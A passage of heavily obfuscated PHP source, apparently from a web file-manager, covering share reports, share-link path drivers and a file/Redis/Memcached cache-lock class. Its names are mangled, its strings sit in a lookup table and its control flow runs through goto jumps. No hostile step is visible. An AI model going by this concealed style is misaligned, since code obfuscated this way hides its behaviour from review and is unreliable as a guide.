($ÒŞè°Û[$ºø°¤Æ[33]]) { $ïÜí’ı[$ÒŞè°Û[$ºø°¤Æ[33]]] = 1; } else { $ïÜí’ı[] = array($ºø°¤Æ[533] => array($ºø°¤Æ[1047], 0), $ºø°¤Æ[633] => array($ºø°¤Æ[1047], 0), $ºø°¤Æ[2032] => $ºø°¤Æ[1985]); } if ($ÒŞè°Û[$ºø°¤Æ[1981]]) { $ïÜí’ı[] = array($ºø°¤Æ[2029] => $ÒŞè°Û[$ºø°¤Æ[1981]], $ºø°¤Æ[1579] => array($ºø°¤Æ[429], "\x25{$ÒŞè°Û[$ºø°¤Æ[1981]]}\x25"), $ºø°¤Æ[2032] => $ºø°¤Æ[1985]); } $ä¶îîñŒ = $this->_makeOrder()->where($ïÜí’ı)->selectPage(20); if (empty($ä¶îîñŒ[$ºø°¤Æ[415]])) { return array(); } $this->_listDataApply($ä¶îîñŒ[$ºø°¤Æ[415]]); return $ä¶îîñŒ; } public function listDataApply($ñ˜ÀÌÕ©) { $this->_listDataApply($ñ˜ÀÌÕ©); return $ñ˜ÀÌÕ©; } private function _listDataApply(&$ÖöÇÅ÷Ñ) { $ïÊÜôİ =& $_SERVER[ ÇƒŠìÀ]; $¥€ ­© = array_to_keyvalue($ÖöÇÅ÷Ñ, $ïÊÜôİ[12], $ïÊÜôİ[1689]); $éÈºÚŸè = Model($ïÊÜôİ[569])->userListInfo(array_unique($¥€ ­©)); $Äà²Æ± = array_to_keyvalue($ÖöÇÅ÷Ñ, $ïÊÜôİ[12], $ïÊÜôİ[183]); $ŠĞ²ÊÔ™ = Model($ïÊÜôİ[854])->sourceListInfo($Äà²Æ±, !0); foreach ($ÖöÇÅ÷Ñ as $££çÃ·© => &$Æ¢àßİ‹) { $ºÆããë¥ = $Æ¢àßİ‹[$ïÊÜôİ[1689]]; $Æ¢àßİ‹[$ïÊÜôİ[2059]] = $éÈºÚŸè[$ºÆããë¥] ? $éÈºÚŸè[$ºÆããë¥] : !1; $öŒÏøªğ = $Æ¢àßİ‹[$ïÊÜôİ[183]]; $Æ¢àßİ‹[$ïÊÜôİ[89]] = $ŠĞ²ÊÔ™[$öŒÏøªğ] ? $ŠĞ²ÊÔ™[$öŒÏøªğ] : !1; if ($Æ¢àßİ‹[$ïÊÜôİ[89]][$ïÊÜôİ[475]] == $ïÊÜôİ[90]) { unset($ÖöÇÅ÷Ñ[$££çÃ·©]); } if ($Æ¢àßİ‹[$ïÊÜôİ[89]] != $ïÊÜôİ[214] && !$Æ¢àßİ‹[$ïÊÜôİ[89]]) { unset($ÖöÇÅ÷Ñ[$££çÃ·©]); } } unset($Æ¢àßİ‹); $ÖöÇÅ÷Ñ = array_values($ÖöÇÅ÷Ñ); } private function _makeOrder($½‘¤á”ş = '') { $Âš¶Ä” =& $_SERVER[ ÇƒŠìÀ]; $¼ À·Û¶ = array($Âš¶Ä”[217], $Âš¶Ä”[790], $Âš¶Ä”[2046], $Âš¶Ä”[2047]); $ĞˆÜ¹‰ = array($Âš¶Ä”[493] => $Âš¶Ä”[494], $Âš¶Ä”[495] => $Âš¶Ä”[496]); $ÉÕõâ = Input::get($Âš¶Ä”[500], $Âš¶Ä”[7], $Âš¶Ä”[467], $¼ À·Û¶); $äò”¼ßÁ = Input::get($Âš¶Ä”[501], $Âš¶Ä”[7], $Âš¶Ä”[2060], array($Âš¶Ä”[1978], $Âš¶Ä”[495])); $äò”¼ßÁ = $ĞˆÜ¹‰[$äò”¼ßÁ]; $½‘¤á”ş = $½‘¤á”ş . "{$ÉÕõâ}\40{$äò”¼ßÁ}"; return $this->order($½‘¤á”ş); } public function reportAdd($§ÑÌß½´) { $ŞíÇºˆ· =& $_SERVER[ ÇƒŠìÀ]; $©û•â‰Î = array($ŞíÇºˆ·[635] => $§ÑÌß½´[$ŞíÇºˆ·[635]], $ŞíÇºˆ·[1689] => USER_ID); if (Model($ŞíÇºˆ·[2056])->where($©û•â‰Î)->find()) { return !1; } $ìéëì«› = array($ŞíÇºˆ·[635] => $§ÑÌß½´[$ŞíÇºˆ·[635]], $ŞíÇºˆ·[1579] => $§ÑÌß½´[$ŞíÇºˆ·[1579]], $ŞíÇºˆ·[183] => $§ÑÌß½´[$ŞíÇºˆ·[183]], $ŞíÇºˆ·[511] => $§ÑÌß½´[$ŞíÇºˆ·[511]], $ŞíÇºˆ·[1689] => USER_ID, $ŞíÇºˆ·[33] => $§ÑÌß½´[$ŞíÇºˆ·[33]], $ŞíÇºˆ·[496] => $§ÑÌß½´[$ŞíÇºˆ·[496]]); return Model($ŞíÇºˆ·[2056])->add($ìéëì«›); } public function reportList($ ŞĞØı) { $œë¢¤èŠ =& $_SERVER[ ÇƒŠìÀ]; $€öãçşÒ = array(); if ($ ŞĞØı[$œë¢¤èŠ[789]]) { $íŸ¹ÃÅ¶ = $ ŞĞØı[$œë¢¤èŠ[790]] ? $ ŞĞØı[$œë¢¤èŠ[790]] : strtotime(date($œë¢¤èŠ[2058])); $€öãçşÒ[$œë¢¤èŠ[217]] = array($œë¢¤èŠ[379], array($ ŞĞØı[$œë¢¤èŠ[789]], $íŸ¹ÃÅ¶)); } if (isset($ ŞĞØı[$œë¢¤èŠ[33]]) && in_array($ ŞĞØı[$œë¢¤èŠ[33]], array($œë¢¤èŠ[90], $œë¢¤èŠ[480], $œë¢¤èŠ[2061], $œë¢¤èŠ[2062], $œë¢¤èŠ[2063]))) { $€öãçşÒ[$œë¢¤èŠ[33]] = $ ŞĞØı[$œë¢¤èŠ[33]]; } if (isset($ ŞĞØı[$œë¢¤èŠ[779]]) && in_array($ ŞĞØı[$œë¢¤èŠ[779]], array($œë¢¤èŠ[214], $œë¢¤èŠ[90], $œë¢¤èŠ[480], $œë¢¤èŠ[2061]))) { $€öãçşÒ[$œë¢¤èŠ[779]] = $ ŞĞØı[$œë¢¤èŠ[779]]; } $²ãú†ıõ = Input::get($œë¢¤èŠ[501], $œë¢¤èŠ[7], $œë¢¤èŠ[2060], array($œë¢¤èŠ[1978], $œë¢¤èŠ[495])); $’É²¥± = array($œë¢¤èŠ[493] => $œë¢¤èŠ[494], $œë¢¤èŠ[495] => $œë¢¤èŠ[496]); $´³„Õ¢† = $œë¢¤èŠ[2064] . $’É²¥±[$²ãú†ıõ]; $ÁÑèşó¦ = Model($œë¢¤èŠ[2056])->where($€öãçşÒ)->order($´³„Õ¢†)->selectPage(20); if (empty($ÁÑèşó¦[$œë¢¤èŠ[415]])) { return array(); } $¢¦™Ò˜á = array_to_keyvalue_group($ÁÑèşó¦[$œë¢¤èŠ[415]], $œë¢¤èŠ[779], $œë¢¤èŠ[635]); if (!empty($¢¦™Ò˜á[0])) { $ ŞĞØı = $¢¦™Ò˜á[0]; $€öãçşÒ = array($œë¢¤èŠ[635] => array($œë¢¤èŠ[7], $ ŞĞØı)); $ şãêª = $this->where($€öãçşÒ)->field($œë¢¤èŠ[635])->select(); $ şãêª = array_to_keyvalue($ şãêª, $œë¢¤èŠ[12], $œë¢¤èŠ[635]); $–Õß¶ù = array_diff($ ŞĞØı, $ şãêª); if (!empty($–Õß¶ù)) { foreach ($ÁÑèşó¦[$œë¢¤èŠ[415]] as $öºİºæ¼ => $÷ğˆ¥š) { if (in_array($÷ğˆ¥š[$œë¢¤èŠ[635]], $–Õß¶ù)) { unset($ÁÑèşó¦[$œë¢¤èŠ[415]][$öºİºæ¼]); } } } } $this->_listDataApply($ÁÑèşó¦[$œë¢¤èŠ[415]]); return $ÁÑèşó¦; } public function reportStatus($Ø°ìÈ¤¾) { $òˆÒ‡î‡ =& $_SERVER[ ÇƒŠìÀ]; $Õ‹­¦´ = array($òˆÒ‡î‡[445] => $Ø°ìÈ¤¾[$òˆÒ‡î‡[445]]); $“ÀÃÓò½ = Model($òˆÒ‡î‡[2056])->where($Õ‹­¦´)->field($òˆÒ‡î‡[2065])->find(); if (!$“ÀÃÓò½) { return !1; } $ÖêÕ‡ = array($òˆÒ‡î‡[779] => $Ø°ìÈ¤¾[$òˆÒ‡î‡[779]]); if ($Ø°ìÈ¤¾[$òˆÒ‡î‡[779]] == $òˆÒ‡î‡[2061] && $“ÀÃÓò½[$òˆÒ‡î‡[779]] == $òˆÒ‡î‡[2061]) { $ÖêÕ‡[$òˆÒ‡î‡[779]] = 0; } $¢äÕ«€û = Model($òˆÒ‡î‡[2056])->where($Õ‹­¦´)->save($ÖêÕ‡); if ($Ø°ìÈ¤¾[$òˆÒ‡î‡[779]] == $òˆÒ‡î‡[480]) { if ($“ÀÃÓò½[$òˆÒ‡î‡[511]] != $òˆÒ‡î‡[214] && $this->shareFileMeta($“ÀÃÓò½[$òˆÒ‡î‡[511]])) { $this->shareFileMeta($“ÀÃÓò½[$òˆÒ‡î‡[511]], 0); } $this->remove($“ÀÃÓò½[$òˆÒ‡î‡[635]]); return !0; } if ($¢äÕ«€û && $Ø°ìÈ¤¾[$òˆÒ‡î‡[779]] == $òˆÒ‡î‡[2061]) { $¬¾¸È¯É = $ÖêÕ‡[$òˆÒ‡î‡[779]] == $òˆÒ‡î‡[2061] ? 1 : 0; $this->shareFileMeta($“ÀÃÓò½[$òˆÒ‡î‡[511]], $¬¾¸È¯É); $this->removeByFile($“ÀÃÓò½[$òˆÒ‡î‡[511]]); } return $¢äÕ«€û; } private function removeByFile($Áı•¾®û) { $ƒ¥ú¢—â =& $_SERVER[ ÇƒŠìÀ]; $¶®–‚¼õ = Model($ƒ¥ú¢—â[854])->where(array($ƒ¥ú¢—â[511] => $Áı•¾®û))->field($ƒ¥ú¢—â[183])->select(); $Ë¦Âê¼† = array_to_keyvalue($¶®–‚¼õ, $ƒ¥ú¢—â[12], $ƒ¥ú¢—â[183]); $Åù³÷Êº = array($ƒ¥ú¢—â[183] => array($ƒ¥ú¢—â[7], $Ë¦Âê¼†), $ƒ¥ú¢—â[533] => 1); $¶®–‚¼õ = $this->where($Åù³÷Êº)->field($ƒ¥ú¢—â[635])->select(); if (empty($¶®–‚¼õ)) { return; } $ºµ³Áƒ = array_to_keyvalue($¶®–‚¼õ, $ƒ¥ú¢—â[12], $ƒ¥ú¢—â[635]); $this->remove($ºµ³Áƒ); } private function shareFileMeta($¤àÇ´òŸ, $ã­¸¬Ğ = null) { $¶ÎšÛ•Ú =& $_SERVER[ ÇƒŠìÀ]; $É¯™šº = array($¶ÎšÛ•Ú[511] => $¤àÇ´òŸ, $¶ÎšÛ•Ú[96] => $¶ÎšÛ•Ú[2066]); if (is_null($ã­¸¬Ğ)) { return Model($¶ÎšÛ•Ú[2067])->where($É¯™šº)->find(); } $É¯™šº[$¶ÎšÛ•Ú[420]] = $ã­¸¬Ğ; Model($¶ÎšÛ•Ú[2067])->add($É¯™šº, array(), !0); } } goto A‹×ùÀ‘°ƒ; D¹°‹ç¾É™: class PathDriverDriverShareItem { public function __construct($Ÿòúä¨) { $this->pathParse = $Ÿòúä¨; } public function __call($ Çßù›ú, $ñí§¤ö) { $ó˜Ë‹Óä =& $_SERVER[ ÇƒŠìÀ]; if (method_exists($this, $ Çßù›ú)) { return; } $·ıÖÛñ‡ = call_user_func_array(array($ó˜Ë‹Óä[1377], $ Çßù›ú), $ñí§¤ö); $ùëéÛ€ = array($ó˜Ë‹Óä[1378], $ó˜Ë‹Óä[1379], $ó˜Ë‹Óä[1380], $ó˜Ë‹Óä[1381], $ó˜Ë‹Óä[588], $ó˜Ë‹Óä[590], $ó˜Ë‹Óä[1382], $ó˜Ë‹Óä[109], $ó˜Ë‹Óä[1383], $ó˜Ë‹Óä[1384]); if (in_array($ Çßù›ú, $ùëéÛ€)) { $·ıÖÛñ‡ = $this->getPathOuter($·ıÖÛñ‡); } return $·ıÖÛñ‡; } public function copy($î•ÂĞ„…, $¿œªÃ¸, $‘Îñş® = false, $ïŒ¦šÚ = false) { return $this->copyMove($î•ÂĞ„…, $¿œªÃ¸, $‘Îñş®, $_SERVER[ ÇƒŠìÀ][588], $ïŒ¦šÚ); } public function move($§¢ßìÄ›, $½¶²†Ä—, $¾îé¥ = false, $ßôÃñÁ­ = false) { return $this->copyMove($§¢ßìÄ›, $½¶²†Ä—, $¾îé¥, $_SERVER[ ÇƒŠìÀ][590], $ßôÃñÁ­); } private function copyMove($«˜¿œÎÍ, $íé©„Á, $Úƒ©øƒá, $ßŞŞ‰, $éÕê®‚ã = false) { $„¨Ã‡Œ… =& $_SERVER[ ÇƒŠìÀ]; $®â¼íÁÙ = $íé©„Á; $û‚¨†Âá = IO::driverMake($íé©„Á); if ($û‚¨†Âá->pathParse[$„¨Ã‡Œ…[1186]]) { $íé©„Á = $û‚¨†Âá->pathParse[$„¨Ã‡Œ…[1186]]; } else { $íé©„Á = $®â¼íÁÙ; } $•İ«Œ×š = IO::copyMove($«˜¿œÎÍ, $íé©„Á, $Úƒ©øƒá, $ßŞŞ‰, $éÕê®‚ã); $•İ«Œ×š = $this->getPathOuter($•İ«Œ×š); return $•İ«Œ×š; } public function pathThis($•ÛÔœĞÆ) { return get_path_this($this->pathParse[$_SERVER[ ÇƒŠìÀ][86]]); } public function pathFather($²–¨ç†) { return get_path_father($this->pathParse[$_SERVER[ ÇƒŠìÀ][86]]); } public function iconvSystem($²œÛÓ÷á) { return $²œÛÓ÷á; } protected function infoParse($¡‰œ, $Îã¶Øì¡ = false) { $äİ‘¯ÒÃ =& $_SERVER[ ÇƒŠìÀ]; $¿š‡Ë = $this->pathParse[$äİ‘¯ÒÃ[531]][$äİ‘¯ÒÃ[1210]] . $this->pathParse[$äİ‘¯ÒÃ[1203]]; if ($Îã¶Øì¡) { $ê•´ó = IO::infoWithChildren($¿š‡Ë); } else { $ê•´ó = IO::info($¿š‡Ë); } $¹éÚÅ£Ò = $this->pathParse[$äİ‘¯ÒÃ[531]]; return Action($äİ‘¯ÒÃ[1375])->_shareItemeParse($ê•´ó, $¹éÚÅ£Ò); } public function listAll($™ÜîŸ¨…) { $Ò¥é®ê… =& $_SERVER[ ÇƒŠìÀ]; $³…óÜíÚ = IO::listAll($™ÜîŸ¨…); $§˜«µ‰ = rtrim($this->pathParse[$Ò¥é®ê…[531]][$Ò¥é®ê…[1210]], $Ò¥é®ê…[8]); foreach ($³…óÜíÚ as &$™Š½±ùÚ) { $™Š½±ùÚ[$Ò¥é®ê…[86]] = $this->pathDriver . $Ò¥é®ê…[8] . ltrim(substr($™Š½±ùÚ[$Ò¥é®ê…[86]], strlen($§˜«µ‰)), $Ò¥é®ê…[8]); } unset($™Š½±ùÚ); return $³…óÜíÚ; } public function listAllSimple($Œ¤ÀÉÁé, $‰¤—¸õ = false) { $Ëİ¾íş =& $_SERVER[ ÇƒŠìÀ]; $¸ÅñŠ» = $this->listAll($Œ¤ÀÉÁé); $“ãßÉò = $this->pathParse[$Ëİ¾íş[465]]; if (trim($“ãßÉò, $Ëİ¾íş[8]) == trim(get_path_father($“ãßÉò), $Ëİ¾íş[8])) { $‰¤—¸õ = !0; } return IO::init($Ëİ¾íş[12])->listAllSimpleMake($¸ÅñŠ», $“ãßÉò, $‰¤—¸õ); } public function getPathOuter($şğÉ¡–ô) { $­ùöÖĞ¾ =& $_SERVER[ ÇƒŠìÀ]; $ÙÇôº“ = KodIO::parse($şğÉ¡–ô); if ($ÙÇôº“[$­ùöÖĞ¾[33]] == KodIO::KOD_SHARE_ITEM) { return $ÙÇôº“[$­ùöÖĞ¾[86]]; } $‘ÚÑ ƒŞ = KodIO::clear($şğÉ¡–ô); $½Æ‚ş¡ = KodIO::clear($this->pathParse[$­ùöÖĞ¾[531]][$­ùöÖĞ¾[1210]]); $´¨ˆœ… = substr($‘ÚÑ ƒŞ, strlen($½Æ‚ş¡)); if (substr($‘ÚÑ ƒŞ, 0, strlen($½Æ‚ş¡)) != $½Æ‚ş¡) { return !1; } return $this->pathParse[$­ùöÖĞ¾[1204]] . $­ùöÖĞ¾[8] . ltrim($´¨ˆœ…, $­ùöÖĞ¾[8]); } public function getType() { $Ô—ã²Á =& $_SERVER[ ÇƒŠìÀ]; $ƒÆæ‡øë = str_replace($Ô—ã²Á[76], $Ô—ã²Á[12], get_class($this)); return strtolower($ƒÆæ‡øë); } public function isTypeObject($İ¢¶Ó¾î) { return IO::isTypeObject($İ¢¶Ó¾î); } public function info($±İ¬™Ì) { return $this->infoParse($±İ¬™Ì); } public function infoAuth($˜ö¡¿ëæ) { return $this->infoParse($˜ö¡¿ëæ); } public function infoWithChildren($üœˆš÷‡) { return $this->infoParse($üœˆš÷‡, !0); } public function infoFull($º˜æöö¼) { return $this->infoParse($º˜æöö¼); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($£±ŒáÒš) { $this->pathParse = $£±ŒáÒš; } protected function infoParse($Ï™õÔÃä, $ûÑòÆÈÎ = false) { $¼Ò×úèî =& $_SERVER[ ÇƒŠìÀ]; return Action($¼Ò×úèî[1209])->sharePathInfo($this->pathParse[$¼Ò×úèî[86]], !0, $ûÑòÆÈÎ); } public function listPath($¬ÅÉÙ£‹, $ÑÄ×ˆ‡µ = false) { $ÄĞˆªñÀ =& $_SERVER[ ÇƒŠìÀ]; $ÎèÕê½† = IO::listPath($¬ÅÉÙ£‹, $ÑÄ×ˆ‡µ); if (!$ÎèÕê½†) { return $ÎèÕê½†; } if (is_array($ÎèÕê½†[$ÄĞˆªñÀ[1376]])) { $şÁçËÙÂ = Action($ÄĞˆªñÀ[1385])->parsePathChildren($ÎèÕê½†[$ÄĞˆªñÀ[1376]], array($ÄĞˆªñÀ[465] => $¬ÅÉÙ£‹)); $ÎèÕê½†[$ÄĞˆªñÀ[1376]] = Action($ÄĞˆªñÀ[1209])->shareItemInfo($şÁçËÙÂ); } foreach ($ÎèÕê½† as $‡•±ÉË => $ÌÕÃß€á) { if (!in_array($‡•±ÉË, array($ÄĞˆªñÀ[85], $ÄĞˆªñÀ[84]))) { continue; } foreach ($ÌÕÃß€á as $Ôæªë‚  => $şÁçËÙÂ) { $şÁçËÙÂ = Action($ÄĞˆªñÀ[1385])->parsePathChildren($şÁçËÙÂ, array($ÄĞˆªñÀ[465] => $¬ÅÉÙ£‹)); $ÎèÕê½†[$‡•±ÉË][$Ôæªë‚ ] = Action($ÄĞˆªñÀ[1209])->shareItemInfo($şÁçËÙÂ); } } return $ÎèÕê½†; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($åşø˜ğè) { parent::__construct($åşø˜ğè); } } goto e•‹¥„¿¹‹; b†ïÕ’ˆ·ß: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $­ĞÈôß• =& $_SERVER[ ÇƒŠìÀ]; if (self::$handle) { return self::$handle; } $¡‡ØşóÒ = $GLOBALS[$­ĞÈôß•[6]][$­ĞÈôß•[395]]; self::$timeout = $¡‡ØşóÒ[$­ĞÈôß•[870]] ? $¡‡ØşóÒ[$­ĞÈôß•[870]] : 10; $•·Ÿè× = _get($GLOBALS[$­ĞÈôß•[6]], $­ĞÈôß•[871]); $ ÃâØ = $¡‡ØşóÒ[$­ĞÈôß•[856]] ? $¡‡ØşóÒ[$­ĞÈôß•[856]] : $­ĞÈôß•[216]; if ($ ÃâØ == $­ĞÈôß•[21] && $•·Ÿè× == $­ĞÈôß•[13]) { $ ÃâØ = $­ĞÈôß•[216]; } switch ($ ÃâØ) { case $­ĞÈôß•[859]: self::$handle = new CacheLockRedis(); break; case $­ĞÈôß•[860]: self::$handle = new CacheLockMemcached(); break; case $­ĞÈôß•[21]: self::$handle = new CacheLockDatabase(); break; case $­ĞÈôß•[216]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($­ĞÈôß•[872], $­ĞÈôß•[873]); } return self::$handle; } private static function key($Úµ÷æ”È) { return $_SERVER[ ÇƒŠìÀ][874] . Cache::key($Úµ÷æ”È); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Î²Æ¸ê = '') { self::$errorMsg = $Î²Æ¸ê; } public static function lockGlobal($£¤ùıüã, $ùúğ¼Ã) { return self::lock($£¤ùıüã, $ùúğ¼Ã, !0); } public static function lock($ãß¥ìË¸, $Â‡º¢Ù¯ = false, $Õûû†à = false) { $Çğ©¸Æ¯ =& $_SERVER[ ÇƒŠìÀ]; $’¨ŒÊ¥Å = self::init(); $Œš×¥š = self::key($ãß¥ìË¸); $Â‡º¢Ù¯ = $Â‡º¢Ù¯ ? $Â‡º¢Ù¯ : self::$timeout; $Í¨”°»€ = timeFloat(); $¦‚ÒŠ‹‹ = $’¨ŒÊ¥Å->lock($Œš×¥š, $Â‡º¢Ù¯); $ëı¥íüÆ = timeFloat(); if (!$¦‚ÒŠ‹‹) { $öş—óÏÑ = "\x6c\157\143\x6b\40\x65\x72\x72\157\x72\x3b\x6b\145\x79\x3d{$ãß¥ìË¸}\x3b\164\x69\x6d\x65\75{$Â‡º¢Ù¯}\73" . self::$errorMsg . $Çğ©¸Æ¯[73] . get_caller_msg(); $ãš‹¢ÙÖ = LNG($Çğ©¸Æ¯[875]) . "\50{$Â‡º¢Ù¯}\163\51\x2e" . LNG($Çğ©¸Æ¯[876]); $ãš‹¢ÙÖ .= $Çğ©¸Æ¯[877]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ãš‹¢ÙÖ = $ãš‹¢ÙÖ . $Çğ©¸Æ¯[878] . self::$errorMsg; } write_log($Çğ©¸Æ¯[879] . sprintf($Çğ©¸Æ¯[880], timeFloat() - $Í¨”°»€) . $Çğ©¸Æ¯[881] . $öş—óÏÑ . $Çğ©¸Æ¯[882] . error_get_last(), $Çğ©¸Æ¯[873]); show_json($ãš‹¢ÙÖ, !1); } if (!$Õûû†à) { self::$lockItem[$Œš×¥š] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $í·Ä®Ê = number_format(timeFloat() - $ëı¥íüÆ, 3); write_log($Çğ©¸Æ¯[883] . $ãß¥ìË¸ . $Çğ©¸Æ¯[884] . $í·Ä®Ê, $Çğ©¸Æ¯[873]); } return $¦‚ÒŠ‹‹; } public static function lockGet($›Ë”Ï‘Ë) { $ïÛ‘Ñâ = self::key($›Ë”Ï‘Ë); if (self::$lockItem[$ïÛ‘Ñâ]) { return self::$lockItem[$ïÛ‘Ñâ]; } return self::init()->lockGet($ïÛ‘Ñâ); } public static function unlock($ÉŸçºû) { $æìÇÓøä =& $_SERVER[ ÇƒŠìÀ]; $¨ë”áÒĞ = self::key($ÉŸçºû); self::$lockItem[$¨ë”áÒĞ] = null; self::init()->unlock($¨ë”áÒĞ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($æìÇÓøä[885] . $ÉŸçºû, $æìÇÓøä[873]); } return; } public static function unlockRuntime() { $úÙºæ¹Ñ =& $_SERVER[ ÇƒŠìÀ]; $–ëŒâ±Û = self::init(); $×õâ‘ö… = !1; foreach (self::$lockItem as $ô‡Åê”“ => $ô‡¬åú÷) { if (!$ô‡¬åú÷) { continue; } $–ëŒâ±Û->unlock($ô‡Åê”“); if (!$×õâ‘ö…) { $×õâ‘ö… = !0; write_log($úÙºæ¹Ñ[886] . $ô‡Åê”“ . $úÙºæ¹Ñ[73] . get_caller_msg(), $úÙºæ¹Ñ[873]); continue; } write_log($úÙºæ¹Ñ[886] . $ô‡Åê”“, $úÙºæ¹Ñ[873]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ª± á¦ä = number_format(timeFloat() - TIME_FLOAT, 3); write_log($úÙºæ¹Ñ[887] . $ª± á¦ä . $úÙºæ¹Ñ[888] . ACTION, $úÙºæ¹Ñ[873]); } } public static function fileLock($¢ß™ê†…) { $¿öËùËÃ =& $_SERVER[ ÇƒŠìÀ]; if (!$GLOBALS[$¿öËùËÃ[889]]) { $GLOBALS[$¿öËùËÃ[889]] = array(); } $GLOBALS[$¿öËùËÃ[889]][$¢ß™ê†…] = !1; $­Âèªï = fopen(DATA_PATH . $¢ß™ê†… . $¿öËùËÃ[890], $¿öËùËÃ[891]); if (!$­Âèªï) { return !1; } $GLOBALS[$¿öËùËÃ[889]][$¢ß™ê†…] = $­Âèªï; if (flock($­Âèªï, LOCK_EX)) { return !0; } self::unlock($¢ß™ê†…); show_json($¿öËùËÃ[892], !1); return !1; } public static function fileUnlock($†ÛøÒ¯Ê) { $®Èşß†á =& $_SERVER[ ÇƒŠìÀ]; $¾áš’¾Ë = $GLOBALS[$®Èşß†á[889]][$†ÛøÒ¯Ê]; if (!$¾áš’¾Ë) { return; } $GLOBALS[$®Èşß†á[889]][$†ÛøÒ¯Ê] = !1; flock($¾áš’¾Ë, LOCK_UN); fclose($¾áš’¾Ë); } public static function fileUnlockAll() { $Ìùş¾ =& $_SERVER[ ÇƒŠìÀ]; if (!$GLOBALS[$Ìùş¾[889]]) { return; } foreach ($GLOBALS[$Ìùş¾[889]] as $Ÿ¼¿•íÔ => $ÆŠ’±ªã) { if (!$ÆŠ’±ªã) { continue; } $GLOBALS[$Ìùş¾[889]][$Ÿ¼¿•íÔ] = !1; flock($ÆŠ’±ªã, LOCK_UN); fclose($ÆŠ’±ªã); } $GLOBALS[$Ìùş¾[889]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ã§ŠÏ¡‹ =& $_SERVER[ ÇƒŠìÀ]; $©ï•¤¥… = $GLOBALS[$Ã§ŠÏ¡‹[6]][$Ã§ŠÏ¡‹[395]]; self::$cachePath = $©ï•¤¥…[$Ã§ŠÏ¡‹[216]][$Ã§ŠÏ¡‹[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($×îğ›ƒƒ, $ÏşäÕØ« = 0) { $Éşà¦Ã¬ =& $_SERVER[ ÇƒŠìÀ]; $’İ¡Œ² = microtime(!0); $´§¬»‡¾ = $’İ¡Œ² + $ÏşäÕØ« + 0.0001; $ÆËæ‡ŒÒ = rtrim(self::$cachePath, $Éşà¦Ã¬[8]) . $Éşà¦Ã¬[893] . md5($×îğ›ƒƒ) . $Éşà¦Ã¬[890]; if (file_exists($ÆËæ‡ŒÒ) && filemtime($ÆËæ‡ŒÒ) && filemtime($ÆËæ‡ŒÒ) < time() - 10) { @unlink($ÆËæ‡ŒÒ); } do { if (file_exists($ÆËæ‡ŒÒ)) { cacheLockWait(); continue; } $öèâÇ¤Ú = fopen($ÆËæ‡ŒÒ, $Éşà¦Ã¬[894]); if (!$öèâÇ¤Ú) { return !1; } $ãÈ…ù±Õ = flock($öèâÇ¤Ú, LOCK_EX | LOCK_NB); self::$caches[$×îğ›ƒƒ] = array($Éşà¦Ã¬[895] => $öèâÇ¤Ú, $Éşà¦Ã¬[216] => $ÆËæ‡ŒÒ); fwrite($öèâÇ¤Ú, $´§¬»‡¾); clearstatcache(); if ($öèâÇ¤Ú && $ãÈ…ù±Õ) { return !0; } cacheLockWait(); } while (microtime(!0) < $´§¬»‡¾); $this->unlock($×îğ›ƒƒ); return !1; } public function lockGet($Õ‘Á¥») { $ŒÊà¼¿‹ =& $_SERVER[ ÇƒŠìÀ]; $Ì¥Î„Ë¸ = rtrim(self::$cachePath, $ŒÊà¼¿‹[8]) . $ŒÊà¼¿‹[893] . md5($Õ‘Á¥») . $ŒÊà¼¿‹[890]; return file_exists($Ì¥Î„Ë¸); } public function unlock($»»Ø¿”û) { $€ß±åš =& $_SERVER[ ÇƒŠìÀ]; $ĞİÕØö = self::$caches[$»»Ø¿”û]; if (!$ĞİÕØö) { return; } @flock($ĞİÕØö[$€ß±åš[895]], LOCK_UN); @fclose($ĞİÕØö[$€ß±åš[895]]); @unlink($ĞİÕØö[$€ß±åš[216]]); unset(self::$caches[$»»Ø¿”û]); } } goto C»±¯“°ó; f—ÅÂ²ÈŠ: function binCheckBigger($§Õ¡ô­¸, $É“õùÀÏ) { return $§Õ¡ô­¸ > $É“õùÀÏ; } $_SERVER[$_SERVER[™”Œ”õÅ][3]] = ("\x38\x33\x31\x31".strrev('24'))+0;$_zgwh="5ps074ku29dvofilqctjxnegmyhb83arw6z14n15idbrwgtuj06m2c3qhxvyak89losez7pfjq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($õ‹ì¡ªÚ, $Ëªé¿°) { $ûàı‘ö³ =& $_SERVER[ ÇƒŠìÀ]; if (isset(self::$_methodList[$õ‹ì¡ªÚ])) { return @call_user_func_array(self::$_methodList[$õ‹ì¡ªÚ], $Ëªé¿°); } else { if (method_exists($this, $õ‹ì¡ªÚ)) { return call_user_func_array(array($this, $õ‹ì¡ªÚ), $Ëªé¿°); } else { think_exception(__CLASS__ . $ûàı‘ö³[4] . $õ‹ì¡ªÚ . $ûàı‘ö³[5]); } } } public static function __callStatic($£ä¼Ê‰, $ƒ…ğË®) { if (isset(self::$_methodListStatic[$£ä¼Ê‰])) { return call_user_func_array(self::$_methodListStatic[$£ä¼Ê‰], $ƒ…ğË®); } else { if (method_exists(self, $£ä¼Ê‰)) { return call_user_func_array(array(self, $£ä¼Ê‰), $ƒ…ğË®); } else { show_json("{$£ä¼Ê‰}\50\51\x20\156\157\x74\x20\145\x78\151\163\164\x3b", !1); } } } public static function addMethod($¼†¯ê‚Á, $şåãöÍ) { self::$_methodList[$¼†¯ê‚Á] = $şåãöÍ; } public static function addMethodStatic($çãä’ö¬, $´Â•êÛà) { self::$_methodListStatic[$çãä’ö¬] = $´Â•êÛà; } } goto e¤”º‘«é; BÖà­øœ¦: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ÛÀâ­†) { parent::__construct($ÛÀâ­†); $this->signatureVersion($_SERVER[ ÇƒŠìÀ][233]); } public function fileOutImage($ÈÅÀÔå«, $ç‹“°÷Ü = 250) { $‡´Ú‹‰Ó =& $_SERVER[ ÇƒŠìÀ]; if 